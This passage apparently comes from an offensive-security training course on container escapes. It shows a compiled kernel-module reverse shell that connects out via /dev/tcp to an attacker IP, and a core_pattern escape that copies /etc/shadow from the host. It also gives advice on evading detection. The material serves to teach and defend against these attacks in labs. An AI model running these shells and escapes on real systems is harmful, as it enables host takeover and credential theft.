As expected, the target is missing all of these packages. We would need to install kmod to load the kernel module, but let's compile the kernel module somewhere else.

To do this, we need to know _kernel version_ and _distro_ of the target. We can obtain this information with the **uname -a** command, which displays all the version information. We will also review the contents of **/etc/os-release** to get information about how we install kmod.

```
victim_cap_sys_module:~# uname -a
Linux victim_cap_sys_module 5.15.0-52-generic #58-Ubuntu SMP Thu Oct 13 08:03:55 UTC 2022 x86_64 Linux
victim_cap_sys_module:~# cat /etc/os-release
NAME="Alpine Linux"
ID=alpine
VERSION_ID=3.16.2
PRETTY_NAME="Alpine Linux v3.16"
HOME_URL="https://alpinelinux.org/"
BUG_REPORT_URL="https://gitlab.alpinelinux.org/alpine/aports/-/issues"
```

> Listing 26 - Obtaining OS and Kernel Information

From these commands, we find that the host's kernel version is _5.15.0-52-generic_ and the operating system is _Ubuntu_. However, the container operating system is _Alpine_. Let's first create a kernel module and compile it. As mentioned earlier, we won't do this on the target container. Instead, we'll start an Ubuntu container in Kali.

Let's use **podman** to start an **ubuntu:20.04** container (the version of ubuntu which was packaged with the 5.15.0-52-generic kernel) and specify that we want to be able to interact with it using **-it** flags and remove it with the **--rm** flag. Next, we'll specify the hostname with **--hostname compiler** and the name of the container with **--name compiler**. Finally, we'll run **/bin/bash** to execute bash in the context of the container.

If Podman isn't already installed in your Kali instance, you can install it with **apt install podman**.

```
kali@kali:~$ podman container run -it --rm --hostname compiler --name compiler ubuntu:20.04 /bin/bash
root@compiler:/#
```

> Listing 27 - Start Container with Podman to Compile the Kernel Module

Next, we need to install the required packages in our Ubuntu container. We'll need _build-essential_ for the tools to compile the kernel module, _nano_ to edit the file, and _linux-headers-5.15.0-52-generic_ to provide the appropriate _kernel headers_. Note that the version of the headers we are installing match that of the victim host we are targeting.

```
root@compiler:/# apt update 
...
root@compiler:/# apt install -y build-essential nano linux-headers-5.15.0-52-generic
...
```

> Listing 28 - Installing Dependencies

Once installed, we'll create a directory to hold our exploit and name it **/exp**. We'll **cd** into that directory and create the **reverse-shell.c** file, which will contain the code for our kernel module reverse shell.

```
root@compiler:/# mkdir exp

root@compiler:/# cd exp

root@compiler:/exp# nano reverse-shell.c

root@compiler:/exp# cat -n reverse-shell.c
     1  #include<linux/module.h>
     2  #include<linux/kmod.h>
     3
     4  MODULE_LICENSE("GPL");
     5
     6  static char command[] = "bash -i >& /dev/tcp/192.168.49.51/4444 0>&1";
     7
     8  static int start_listener(void){
     9          char *argv[] = {"/bin/bash", "-c", command, NULL};
    10          static char *env[] = {"HOME=/", NULL};
    11          return call_usermodehelper(argv[0], argv, env, UMH_WAIT_PROC);
    12  }
    13
    14  static void kill_listener(void){
    15          printk(KERN_INFO "Exiting\n");
    16          return;
    17  }
    18
    19  module_init(start_listener);
    20  module_exit(kill_listener);
```

> Listing 29 - Creating Reverse Shell Kernel Module

The code starts by importing the required libraries on the first two lines. Next, we need to specify the license or the _compiler_ will throw an error. On line 6, we'll specify the command we want to run. In this command we'll use a common _bash reverse shell_, which points back to our Kali IP on port 4444.

Next, we need to define how the module should initialize and exit. We'll start with the initialization by creating a function called _start_listener_ on lines 8-12. This function will create an _argument vector_ with the command we want to run, set up the _environmental variables_ required for the command to work, and run it through the _call_usermodehelper_[1](https://portal.offsec.com/learning-paths/offensive-cloud-foundations-167536/learning/container-escapes-interacting-with-the-host-51510/executing-commands-51564/labs-51511#fn-local_id_1093-1) function. We want our reverse shell to run as the _root_ user on the host as a user mode application and the _call_usermodehelper_ function will do that for us. On line 19, we'll indicate that we want _start_listener_ as the function to be called at insertion time by calling the _module_init_[2](https://portal.offsec.com/learning-paths/offensive-cloud-foundations-167536/learning/container-escapes-interacting-with-the-host-51510/executing-commands-51564/labs-51511#fn-local_id_1093-2) macro.

Once the initialization is complete, we need to specify how the module should exit. Without this, we would need to _reboot_ the host to unload the module. On lines 14-17 we have the _kill_listener_ function, which will print a message that we're exiting. In the real-world, we probably would not print anything in order to stay more silent. However, logging does help us _debug_ exploits if needed. We'll specify that the _kill_listener_ function will be run on exit by passing it through the _module_exit_[3](https://portal.offsec.com/learning-paths/offensive-cloud-foundations-167536/learning/container-escapes-interacting-with-the-host-51510/executing-commands-51564/labs-51511#fn-local_id_1093-3) macro.

With the module code created, we need to compile it. For this, we'll create a _Makefile_, which will define the tasks to be executed for the compilation to succeed.

```
root@compiler:/exp# nano Makefile

root@compiler:/exp# cat -n Makefile
     1  obj-m +=reverse-shell.o
     2
     3  all:
     4          make -C /lib/modules/5.15.0-52-generic/build M=$(PWD) modules
     5
     6  clean:
     7          make -C /lib/modules/5.15.0-52-generic/build M=$(PWD) clean
```

> Listing 30 - Create the Makefile

We'll start by specifying the object file (**reverse-shell.o**) to output with the _obj-m_ variable. After linking the object file, the compiler will provide us with **reverse-shell.ko**, which will be the actual kernel module we'll load.

On line 3, we need to specify which objects to build. We are only trying to build the single object, so we'll target it with the **all** target.

On line 4, we'll specify the command to build the module. The **-C** argument specifies the _source of the kernel_, which matches the target's kernel, not our Kali kernel. The value of **M** specifies the _path of the directory_ where the builder can find the module. The **modules** keyword at the end is the target that indicates we want to build an external module.

Finally, the **clean** section is for us _to clear the directory_ in case we need to start over. If needed, we would run **make clean** to delete all generated files. This won't delete the **Makefile** or the **reverse-shell.c** file.

Now that we have our instructions, lets compile the module by running **make**.

```
root@compiler:/exp# make
make -C /lib/modules/5.15.0-52-generic/build M=/exp modules
make[1]: Entering directory '/usr/src/linux-headers-5.15.0-52-generic'
  CC [M]  /exp/reverse-shell.o
  MODPOST /exp/Module.symvers
  CC [M]  /exp/reverse-shell.mod.o
  LD [M]  /exp/reverse-shell.ko
  BTF [M] /exp/reverse-shell.ko
Skipping BTF generation for /exp/reverse-shell.ko due to unavailability of vmlinux
make[1]: Leaving directory '/usr/src/linux-headers-5.15.0-52-generic'

root@compiler:/exp# ls -alh
total 420K
drwxr-xr-x. 2 root root 4.0K Oct 20 21:50 .
dr-xr-xr-x. 1 root root   84 Oct 20 21:49 ..
-rw-r--r--. 1 root root  146 Oct 20 21:50 .Module.symvers.cmd
-rw-r--r--. 1 root root  104 Oct 20 21:50 .modules.order.cmd
-rw-r--r--. 1 root root  170 Oct 20 21:50 .reverse-shell.ko.cmd
-rw-r--r--. 1 root root   94 Oct 20 21:50 .reverse-shell.mod.cmd
-rw-r--r--. 1 root root  38K Oct 20 21:50 .reverse-shell.mod.o.cmd
-rw-r--r--. 1 root root  38K Oct 20 21:50 .reverse-shell.o.cmd
-rw-r--r--. 1 root root  162 Oct 20 21:50 Makefile
-rw-r--r--. 1 root root    0 Oct 20 21:50 Module.symvers
-rw-r--r--. 1 root root   22 Oct 20 21:50 modules.order
-rw-r--r--. 1 root root  715 Oct 20 21:49 reverse-shell.c
-rw-r--r--. 1 root root 147K Oct 20 21:50 reverse-shell.ko
-rw-r--r--. 1 root root   22 Oct 20 21:50 reverse-shell.mod
-rw-r--r--. 1 root root  826 Oct 20 21:50 reverse-shell.mod.c
-rw-r--r--. 1 root root 131K Oct 20 21:50 reverse-shell.mod.o
-rw-r--r--. 1 root root  17K Oct 20 21:50 reverse-shell.o
```

> Listing 31 - Compiling the Kernel Module

At this point, we have compiled the module and can find the **reverse-shell.ko** file in the folder. Next, we'll need to transfer this file into our target container. To do this, we'll use **podman cp** in a new terminal window to transfer the file out of the compiler container and **scp** to transfer it to the target container.

With the **podman** command, we need to specify the name of the container, **compiler**, and the file **/exp/reverse-shell.ko** (separated by a colon). We'll also specify that we want to save it in our current directory with **./**. Once it's out of the container, we'll transfer the file to the **/root** directory of the target with **scp**.

```
kali@kali:~$ podman cp compiler:/exp/reverse-shell.ko ./ 

kali@kali:~$  scp -P 2222 reverse-shell.ko root@sandbox:/root/ 
root@sandbox's password:
reverse-shell.ko               100%  146KB  68.2MB/s   00:00
```

> Listing 32 - Transfering Reverse Shell

Next, we need to actually insert the module into the kernel. To do this, our target OS must have the appropriate binaries and libraries. We'll use **insmod** to insert the module binary, which comes with the _kmod_ package. However, kmod also requires the _xz-libs_ and _zstd-libs_ packages.

To get these on our target, we'll start an Alpine container with the same version of the target OS (3.16.2). We'll then use the Alpine package manager, _apk_, to download the packages locally.

Let's use the same command we used to start the compiler container. But this time, we'll use **alpine:3.16.2** as the image, name the container **kmod**, and execute **/bin/ash** instead of **/bin/bash** since Alpine Linux uses ash instead of bash for the shell.

Once the container starts, we'll run **apk update** to update the _indexes_. Then, we'll use **apk fetch** with the list of packages to download the three "apk" packages.

```
kali@kali:~$  podman container run -it --rm --hostname kmod --name kmod alpine:3.16.2 /bin/ash
/ # apk update
fetch https://dl-cdn.alpinelinux.org/alpine/v3.16/main/aarch64/APKINDEX.tar.gz
fetch https://dl-cdn.alpinelinux.org/alpine/v3.16/community/aarch64/APKINDEX.tar.gz
v3.16.2-334-gfa0f6c3878 [https://dl-cdn.alpinelinux.org/alpine/v3.16/main]
v3.16.2-335-ge36aa4fb66 [https://dl-cdn.alpinelinux.org/alpine/v3.16/community]
OK: 16894 distinct packages available
/ # apk fetch kmod xz-libs zstd-libs
Downloading zstd-libs-1.5.2-r1
Downloading kmod-29-r2
Downloading xz-libs-5.2.5-r1
/ # ls -alh *.apk
-rw-r--r--    1 root     root       65.4K Apr 18  2022 kmod-29-r2.apk
-rw-r--r--    1 root     root       71.4K Apr 18  2022 xz-libs-5.2.5-r1.apk
-rw-r--r--    1 root     root      202.0K Apr 18  2022 zstd-libs-1.5.2-r1.apk
/ #
```

> Listing 33 - Downloading the Required Packages

In a new terminal window, we'll again use **podman cp** to transfer the packages to Kali. Once they're transferred, we'll use **scp** to transfer them to the target.

```
kali@kali:~$ podman cp kmod:/kmod-29-r2.apk ./

kali@kali:~$ podman cp kmod:/xz-libs-5.2.5-r1.apk ./

kali@kali:~$ podman cp kmod:/zstd-libs-1.5.2-r1.apk ./

kali@kali:~$ scp -P 2222 kmod-29-r2.apk xz-libs-5.2.5-r1.apk zstd-libs-1.5.2-r1.apk root@sandbox:/root/
root@sandbox's password:
kmod-29-r2.apk                        100%   65KB   7.3MB/s   00:00
xz-libs-5.2.5-r1.apk                  100%   71KB  36.7MB/s   00:00
zstd-libs-1.5.2-r1.apk                100%  202KB  65.5MB/s   00:00
```

> Listing 34 - Transferring the Required Packages

Next, we'll go back to our target's shell and install the packages. We'll indicate that we don't need **apk** to download the packages with the **--no-network** option and specify the three packages we want to install as a list of files.

```
victim_cap_sys_module:~# apk add --no-network xz-libs-5.2.5-r1.apk zstd-libs-1.5.2-r1.apk kmod-29-r2.apk
WARNING: Ignoring https://dl-cdn.alpinelinux.org/alpine/v3.16/main: No such file or directory
WARNING: Ignoring https://dl-cdn.alpinelinux.org/alpine/v3.16/community: No such file or directory
(1/3) Installing xz-libs (5.2.5-r1)
(2/3) Installing zstd-libs (1.5.2-r1)
(3/3) Installing kmod (29-r2)
Executing busybox-1.35.0-r17.trigger
OK: 6 MiB in 17 packages
```

> Listing 35 - Installing the Required Packages

Before we can load the kernel module, we'll need to start a **ncat** listener to catch our shell. We'll use **nc** in Kali with the **-v** flag to make it _verbose_, **-l** flag to listen on a port, and **-p** to specify the port number (port 4444, in this case). This port is the same one we configured in our kernel module before we compiled it.

```
kali@kali:~$ nc -vlp 4444
listening on [any] 4444 ...
```

> Listing 36 - Starting the listener

Finally, we can load the module into the kernel. We'll use the **insmod** binary and provide it with the module file **reverse-shell.ko**.

```
victim_cap_sys_module:~# insmod reverse-shell.ko
```

> Listing 37 - Inserting Module into Kernel

If we check our shell, we should be able to execute commands on the host. We can verify that it is the host by running **docker ps** and listing our victim container.

```
bash: cannot set terminal process group (-1): Inappropriate ioctl for device
bash: no job control in this shell
root@sandbox:/# id
id
uid=0(root) gid=0(root) groups=0(root)

root@sandbox:/# hostname
hostname
sandbox

root@sandbox:/# docker ps
docker ps
CONTAINER ID   IMAGE     COMMAND                  CREATED       STATUS       PORTS                                   NAMES
275b24cc2bf3   victim    "/usr/sbin/sshd -D -e"   4 hours ago   Up 4 hours   0.0.0.0:2222->22/tcp, :::2222->22/tcp   exercises-victim_cap_sys_module-1
```

> Listing 38 - Getting a Shell

Excellent! We were able to escape our container and execute a shell on the host by loading a kernel module.

It's important to note that in this case, we loaded a reverse shell kernel module. Depending on the target's level of observability, this might trigger an alert.

However, if the container already contains the CAP_SYS_MODULE capability, it's probably already loading kernel modules. We could modify these expected kernel modules with our malicious one to potentially avoid detection.

While we displayed how to call a user mode program and get a shell, it's also possible to extract data from the kernel and trace other applications.

1

(Linux Kernel Organization, 2022), [https://www.kernel.org/doc/htmldocs/kernel-api/API-call-usermodehelper.html](https://www.kernel.org/doc/htmldocs/kernel-api/API-call-usermodehelper.html) [↩︎](https://portal.offsec.com/learning-paths/offensive-cloud-foundations-167536/learning/container-escapes-interacting-with-the-host-51510/executing-commands-51564/labs-51511#fnref-local_id_1093-1)

2

(Linux Kernel Organization, 2022), [https://www.kernel.org/doc/htmldocs/kernel-hacking/routines-init-again.html](https://www.kernel.org/doc/htmldocs/kernel-hacking/routines-init-again.html) [↩︎](https://portal.offsec.com/learning-paths/offensive-cloud-foundations-167536/learning/container-escapes-interacting-with-the-host-51510/executing-commands-51564/labs-51511#fnref-local_id_1093-2)

3

(Linux Kernel Organization, 2022), [https://www.kernel.org/doc/htmldocs/kernel-hacking/routines-moduleexit.html](https://www.kernel.org/doc/htmldocs/kernel-hacking/routines-moduleexit.html) [↩︎](https://portal.offsec.com/learning-paths/offensive-cloud-foundations-167536/learning/container-escapes-interacting-with-the-host-51510/executing-commands-51564/labs-51511#fnref-local_id_1093-3)

## Resources

Some of the labs require you to start the target machine(s) below.

Please note that the IP addresses assigned to your target machines may not match those referenced in the Module text and video.

Containers - Kernel Module - Exercise

#### Labs

Use the "Containers - Kernel Module - Exercise" vm and connect to the victim via ssh on port 2222 with the username root and the password root. Load a module into the kernel and extract the flag found in **/root/proof.txt**

Answer

## 7.2.5. Accessing the Labs - Escaping a Privileged Container with core_pattern

In this next section, we'll use a single target to learn about escaping a privileged container using the _core_pattern_ kernel feature.

We'll start the virtual machine for this section below. We will connect to our shell via SSH on port 2222. From this shell, we will conduct our attack. It's important to note that the victim container has several non-standard binaries (such as **nmap**). We've provided these to simplify access. In the real world, these would have to be transferred or installed.

Let's start the "core_pattern" host and continue with the Learning Module.

## Resources

Some of the labs require you to start the target machine(s) below.

Please note that the IP addresses assigned to your target machines may not match those referenced in the Module text and video.

Containers - core_pattern

## 7.2.6. Escaping a Privileged Container with core_pattern

So far, we have been reviewing containers that have a very specific misconfiguration (a single capability added, for example). However, most container runtimes allow users to run "privileged" containers. The privilege flag configures the container where it adds _all capabilities_,[1](https://portal.offsec.com/learning-paths/offensive-cloud-foundations-167536/learning/container-escapes-interacting-with-the-host-51510/executing-commands-51564/labs-51511#fn-local_id_1096-1) removes _AppArmor_[2](https://portal.offsec.com/learning-paths/offensive-cloud-foundations-167536/learning/container-escapes-interacting-with-the-host-51510/executing-commands-51564/labs-51511#fn-local_id_1096-2) and _SELinux policies_,[3](https://portal.offsec.com/learning-paths/offensive-cloud-foundations-167536/learning/container-escapes-interacting-with-the-host-51510/executing-commands-51564/labs-51511#fn-local_id_1096-3) removes _seccomp_[4](https://portal.offsec.com/learning-paths/offensive-cloud-foundations-167536/learning/container-escapes-interacting-with-the-host-51510/executing-commands-51564/labs-51511#fn-local_id_1096-4) policies, allows access to all devices,[5](https://portal.offsec.com/learning-paths/offensive-cloud-foundations-167536/learning/container-escapes-interacting-with-the-host-51510/executing-commands-51564/labs-51511#fn-local_id_1096-5) and adds _write_ permissions to the **/sys**[6](https://portal.offsec.com/learning-paths/offensive-cloud-foundations-167536/learning/container-escapes-interacting-with-the-host-51510/executing-commands-51564/labs-51511#fn-local_id_1096-6) and **/cgroup**[7](https://portal.offsec.com/learning-paths/offensive-cloud-foundations-167536/learning/container-escapes-interacting-with-the-host-51510/executing-commands-51564/labs-51511#fn-local_id_1096-7) file system. This significantly increases the attack surface to allow a container to escape. Unfortunately, for the state of security, the "privileged" feature is much more common in the real world than individual attacks. This means that every container escape we have learned thus far that exploits misconfigured capabilities will also work on a privileged container.

It is not a secret that it's possible to execute commands on the host from a privileged container. Typically, these "exploits" are using kernel features as intended. Common vectors include using the following kernel features:

- release_agent
- binfmt_misc
- core_pattern
- uevent_helper

In this section, we'll be focusing on the _core_pattern_ exploit to escape a container. As we'll find, _core_pattern_ is part of the _core dump_ functionality in Linux. Core dumps allow developers to analyze the memory at the moment of a crash. These crashes typically start when a specific signal is sent to the process.

Linux supports various _signals_[8](https://portal.offsec.com/learning-paths/offensive-cloud-foundations-167536/learning/container-escapes-interacting-with-the-host-51510/executing-commands-51564/labs-51511#fn-local_id_1096-8) that instruct a process to terminate. For example, when we press C+c to interrupt a running process in the terminal, we are sending a _SIGINT_. If we were to use the **kill** command to stop a process, we are sending a _SIGTERM_. Some of these signals (_SIGQUIT_, _SIGILL_, _SIGABRT_, _SIGFPE_ and _SIGSEGV_) also inform the kernel that the termination might have been caused by an error that needs to be further investigated. Because of this, the kernel will create a snapshot of the process's memory and save it to a file named **core**. Many distributions change this default behavior to a custom solution.

Let's start by connecting to the target and conducting our standard information gathering in a container.

```
kali@kali:~$ ssh -p 2222 root@sandbox
root@sandbox's password:
Welcome to Alpine!
...

victim_core_pattern:~#
```

> Listing 39 - Obtaining a shell in the Monitor Container

We'll list the capabilities by reading the **/proc/1/status** file and use **capsh --decode** to _decode_ the value.

```
victim_core_pattern:~# cat /proc/1/status | grep Cap
CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000

victim_core_pattern:~# capsh --decode=0000003fffffffff
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
```

> Listing 40 - Getting Capabilities

The long list is our first hint that this container might be _privileged_.

Next, we'll list the _mounts_ on the container by running **mount**.

```
victim_core_pattern:~# mount
overlay on / type overlay (rw,relatime,lowerdir=/var/lib/docker/overlay2/l/BUKHP6JK2QO2F5NWWT3DEDHHH7:/var/lib/docker/overlay2/l/CT5UBZSLVUJHPUNHM7BNKWQMSR:/var/lib/docker/overlay2/l/NHCEII4ZJM7C7TFQD3N4I3O4RL:/var/lib/docker/overlay2/l/UIY73XJZOTQIGEAF2EXAOU4KG7,upperdir=/var/lib/docker/overlay2/22e3208a2207a6752cf877a15a23e51a1c1fb55ffe273680a710d9ee6d3264db/diff,workdir=/var/lib/docker/overlay2/22e3208a2207a6752cf877a15a23e51a1c1fb55ffe273680a710d9ee6d3264db/work)
proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)
tmpfs on /dev type tmpfs (rw,nosuid,size=65536k,mode=755,inode64)
devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=666)
sysfs on /sys type sysfs (rw,nosuid,nodev,noexec,relatime)
...
shm on /dev/shm type tmpfs (rw,nosuid,nodev,noexec,relatime,size=65536k,inode64)
/dev/sda1 on /etc/resolv.conf type ext4 (rw,relatime,discard,errors=remount-ro)
/dev/sda1 on /etc/hostname type ext4 (rw,relatime,discard,errors=remount-ro)
/dev/sda1 on /etc/hosts type ext4 (rw,relatime,discard,errors=remount-ro)
```

> Listing 41 - Reviewing Container Mounts

The mounts provide us with a significant amount of information. For starters, we find that the container mounts the **/sys** file system as _read-write_, reaffirming that this is a container running in the "privileged" context.

We also find the location of the container's root file system on the host in the _upperdir_ variable of the root mount. We'll need this information later.

Next, let's find out how the host is currently configured to handle application crashes. We can do this by inspecting **/proc/sys/kernel/core_pattern**.

```
victim_core_pattern:~# cat /proc/sys/kernel/core_pattern
|/usr/share/apport/apport -p%p -s%s -c%c -d%d -P%P -u%u -g%g -- %E
```

> Listing 42 - Inspecting current core_pattern

The current **core_pattern** configuration is often the default in Ubuntu. If this was set to the default Linux configuration, it would only contain the word "core" to instruct the kernel _to dump the memory_ to a file called **core**. This file also allows the use of certain _templating variables_. For example, _%p_ is the _pid_ of the process and _%s_ is the _signal_ that caused the dump. We can find the use of these templates in our configuration above.

We also find that the **core_pattern** starts with a _pipe_. The pipe is an alternative syntax for **core_pattern** where if the first character is a pipe, the rest of the content will be treated as a command. In a way, this pipes the core dump into another program to be processed.

In Ubuntu, _apport_ is the application that processes application crashes. If enabled, and the system contains a _GUI_, apport will display an alert indicating that an application has crashed. From here, the user can send the core dump to the developer.

![[OffSec/Cloud/Offensive Cloud Foundations/z. images/03f7899e3065b5decc6f481cc4c6a6fa_MD5.jpg]]

Figure 2: Apport Crash Report

If we can control the value of **core_pattern**, we can pipe the core dump into a script or program we control. The kernel will execute our script as _root_.

The kernel will execute the piped section of the **core_pattern** in the context of the host's file system and not the container's file system. This means when we instruct the kernel to execute a script, we'll need to write a script to the host's file system and know the _full path_.

Let's create a _regular expression_ to take the value and save it in a variable called _host_path_. Instead of using the output of the **mount** command, we'll go directly to the source to make this command more universal. We can find the list of mounts in **/proc/mounts**.

We'll use **sed** to find the value of **upperdir=**. Next, we'll select everything before and at (**.*upperdir=**). Next, we'll use a regex capturing group to select everything before the next comma (**([^,]*)**). We'll select the value in that first capturing group (**\1**), which should contain the host path, and we'll print this value (**/p**). All of this will be executed with the substitution function (**s/**). Essentially, our regular expression will extract the value of **upperdir** and save it to a variable.

```
victim_core_pattern:~# host_path=$(sed -n 's/.*upperdir=\([^,]*\).*/\1/p' /proc/mounts)

victim_core_pattern:~# echo $host_path
/var/lib/docker/overlay2/22e3208a2207a6752cf877a15a23e51a1c1fb55ffe273680a710d9ee6d3264db/diff
```

> Listing 43 - Obtaining and Setting the Host Path

Now that we have the container's file system location on the host, the root of the container on any file we write to can be referenced from the _full path_ on the host.

Next, let's make a script in the root of the container file system to be executed by the host. We'll name this script **cmd** and start with the standard shebang. Then, we'll **cat** the **/etc/shadow** file and output its contents to **output** in the container's root directory. Remember, to reference the container's root directory, we need to use the **$host_path** variable. Finally, we'll use the **chmod** binary to make the script executable.

```
victim_release_agent:~# echo "#!/bin/sh" > /cmd

victim_release_agent:~# echo "cat /etc/shadow > $host_path/output" >> /cmd

victim_release_agent:~# chmod a+x /cmd
```

> Listing 44 - Creating Executable Script

Next, we need to change the value of **core_pattern** to execute our script. We'll start by echoing with the pipe, as documented by the **core_pattern** syntax. After the pipe, we'll specify the script we just created, but on the host's file system. We'll redirect all of this to **/proc/sys/kernel/core_pattern**.

```
victim_core_pattern:~# echo "|$host_path/cmd" > /proc/sys/kernel/core_pattern
```

> Listing 45 - Configuring core_pattern

Next, we need to cause a core dump. We could create an application that crashes. We could also start a process and kill it with any of the signals that cause a _core dump_. In our example, we'll use _SIGQUIT_.

It's important to note that some environments might carefully monitor crashes. If we suspected this was the case, we could try to determine if there is a maintenance schedule and plan our crash around it. That way, an alert has a higher chance of being ignored.

As for the process we want to crash, we'll run **sleep** since we can control how long the process runs, which should give us time to send the signal. We'll run **sleep 60** to sleep for 60 seconds and send it to the background by adding an _ampersand_ (**&**) at the end.

We can use **kill** with the **-s** flag to send a **SIGQUIT** signal to the process. Next, we need the _process ID_(PID) of the sleep command, which we can obtain from the **$!** variable. The **$!** variable holds the PID of the previously executed process.

```
victim_core_pattern:~# sleep 60 &

victim_core_pattern:~# kill -s SIGQUIT $!

victim_core_pattern:~#
[5]+  Quit                    (core dumped) sleep 60
```

> Listing 46 - Starting a Proccess and Sending the SIGQUIT Signal

After sending the signal, if we press I in the terminal again, we should find that a core dump was generated by sending the signal. Let's check the contents of the **/output** file to verify script execution.

```
victim_core_pattern:~# cat /output
root:*:19279:0:99999:7:::
...
lxd:!:19282::::::
student:$6$tWaa3gaveH$r9dM8IQAKccd6hm2gN9x/zMS1yMCoM5j4N1cauTE0izQaGznciab41MnuViuhCNaASU6M4zGnCvuec.OTbZ8E0:19282:0:99999:7:::
dnsmasq:*:19282:0:99999:7:::
```

> Listing 47 - Viewing Output

Excellent! We were able to execute commands on the host!

In this section, we were able to utilize the kernel feature that generates memory dumps to execute commands on the host. This is just one of many features that can lead to code execution on the host from a container.

1

(Moby, 2022), [https://github.com/moby/moby/blob/89555e45f266efd629d72581f4d181ff959aa3a5/oci/caps/utils.go#L85-L87](https://github.com/moby/moby/blob/89555e45f266efd629d72581f4d181ff959aa3a5/oci/caps/utils.go#L85-L87) [↩︎](https://portal.offsec.com/learning-paths/offensive-cloud-foundations-167536/learning/container-escapes-interacting-with-the-host-51510/executing-commands-51564/labs-51511#fnref-local_id_1096-1)

2

(Moby, 2022), [https://github.com/moby/moby/blob/89555e45f266efd629d72581f4d181ff959aa3a5/daemon/container_linux.go#L22-L23](https://github.com/moby/moby/blob/89555e45f266efd629d72581f4d181ff959aa3a5/daemon/container_linux.go#L22-L23) [↩︎](https://portal.offsec.com/learning-paths/offensive-cloud-foundations-167536/learning/container-escapes-interacting-with-the-host-51510/executing-commands-51564/labs-51511#fnref-local_id_1096-2)

3

(Moby, 2022), [https://github.com/moby/moby/blob/89555e45f266efd629d72581f4d181ff959aa3a5/daemon/create.go#L233-L237](https://github.com/moby/moby/blob/89555e45f266efd629d72581f4d181ff959aa3a5/daemon/create.go#L233-L237) [↩︎](https://portal.offsec.com/learning-paths/offensive-cloud-foundations-167536/learning/container-escapes-interacting-with-the-host-51510/executing-commands-51564/labs-51511#fnref-local_id_1096-3)

4

(Moby, 2022), [https://github.com/moby/moby/blob/89555e45f266efd629d72581f4d181ff959aa3a5/daemon/seccomp_linux.go#L23-L24](https://github.com/moby/moby/blob/89555e45f266efd629d72581f4d181ff959aa3a5/daemon/seccomp_linux.go#L23-L24) [↩︎](https://portal.offsec.com/learning-paths/offensive-cloud-foundations-167536/learning/container-escapes-interacting-with-the-host-51510/executing-commands-51564/labs-51511#fnref-local_id_1096-4)

5

(Moby, 2022), [https://github.com/moby/moby/blob/89555e45f266efd629d72581f4d181ff959aa3a5/daemon/oci_linux.go#L882-L899](https://github.com/moby/moby/blob/89555e45f266efd629d72581f4d181ff959aa3a5/daemon/oci_linux.go#L882-L899) [↩︎](https://portal.offsec.com/learning-paths/offensive-cloud-foundations-167536/learning/container-escapes-interacting-with-the-host-51510/executing-commands-51564/labs-51511#fnref-local_id_1096-5)

6

(Moby, 2022), [https://github.com/moby/moby/blob/89555e45f266efd629d72581f4d181ff959aa3a5/daemon/oci_linux.go#L687-L696](https://github.com/moby/moby/blob/89555e45f266efd629d72581f4d181ff959aa3a5/daemon/oci_linux.go#L687-L696) [↩︎](https://portal.offsec.com/learning-paths/offensive-cloud-foundations-167536/learning/container-escapes-interacting-with-the-host-51510/executing-commands-51564/labs-51511#fnref-local_id_1096-6)

7

(Moby, 2022), [https://github.com/moby/moby/blob/89555e45f266efd629d72581f4d181ff959aa3a5/daemon/oci_linux.go#L700-L706](https://github.com/moby/moby/blob/89555e45f266efd629d72581f4d181ff959aa3a5/daemon/oci_linux.go#L700-L706) [↩︎](https://portal.offsec.com/learning-paths/offensive-cloud-foundations-167536/learning/container-escapes-interacting-with-the-host-51510/executing-commands-51564/labs-51511#fnref-local_id_1096-7)

8

(GNU, 2022), [https://ftp.gnu.org/old-gnu/Manuals/glibc-2.2.3/html_node/libc_462.html](https://ftp.gnu.org/old-gnu/Manuals/glibc-2.2.3/html_node/libc_462.html) [↩︎](https://portal.offsec.com/learning-paths/offensive-cloud-foundations-167536/learning/container-escapes-interacting-with-the-host-51510/executing-commands-51564/labs-51511#fnref-local_id_1096-8)

## Resources

Some of the labs require you to start the target machine(s) below.

Please note that the IP addresses assigned to your target machines may not match those referenced in the Module text and video.

Containers - core_pattern - Exercise

#### Labs

Use the "Containers - core_pattern - Exercise" vm and connect to the victim via ssh on port 2222 with the username root and the password root. Exploit the core_pattern exploit to escape out of the container. Once executing commands on the host, find the flag in **/root/proof.txt**.

Answer

## 7.2.7. Accessing the Labs - Escaping a Privileged Container with release_agent

In this next section, we'll use a single target to learn about escaping a privileged container using the _release_agent_ kernel feature.

We'll start the virtual machine for this section below. We will connect to our shell via SSH on port 2222. From this shell we will conduct our attack. It's important to note that the victim container has several non-standard binaries (such as **nmap**). We've provided these to simplify access. In the real world, these would have to be transferred or installed.

Let's start the "release_agent" host for the "Escaping a Privileged Container - release_agent" portion and continue with the Learning Module.

## Resources

Some of the labs require you to start the target machine(s) below.

Please note that the IP addresses assigned to your target machines may not match those referenced in the Module text and video.

Containers - release_agent

## 7.2.8. Escaping a Privileged Container with release_agent

The _core_pattern_ exploit isn't the only kernel feature that a container can use to instruct the kernel to run a specific command. Another feature is _release_agent_.

In this section, we'll discuss how to escape a privileged container using the _cgroup v1_ release notification (_release_agent_) kernel feature. While we'll target a privileged container, it's important to note that the exploit only requires the _CAP_SYS_ADMIN_ capability and the ability to call the _mount_ syscall. Both of these are allowed with a privileged container.

A real-world example of the purpose of cgroups v1 release notification is to delete a _cgroup_ once the process in the cgroup no longer contains any tasks. For example, container runtimes add containers into a cgroup and if the cgroups are never deleted, the system may become cluttered. A container runtime can use the release notification feature to delete a cgroup when the container exits.

